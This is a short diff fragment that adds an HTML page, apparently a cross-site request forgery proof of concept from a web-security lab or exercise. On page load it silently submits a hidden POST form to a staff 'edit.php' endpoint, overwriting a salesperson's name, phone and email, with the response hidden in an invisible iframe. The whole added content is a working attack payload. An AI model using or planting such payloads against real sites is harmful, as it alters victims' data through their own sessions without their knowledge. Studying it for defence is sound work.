@@ -21,3 +21,15 @@
 --->
     
    
+<html>
+    <body onload="document.myForm.submit()"> 
+        <form name="myForm" method="POST" action="./staff/salespeople/edit.php?id=5" style="display: none;" target="r"> 
+            <input type="text" name="first_name" value="Ronald">
+            <input type="text" name="last_name" value="McDonald">
+            <input type="text" name="phone" value="123-456-7890">
+            <input type="text" name="email" value="ron@mcdonald.com">
+            <input type="submit" value="Submit" hidden="">
+        </form><iframe name="r" style="display: none;">
+        </iframe>
+    </body>
+</html>
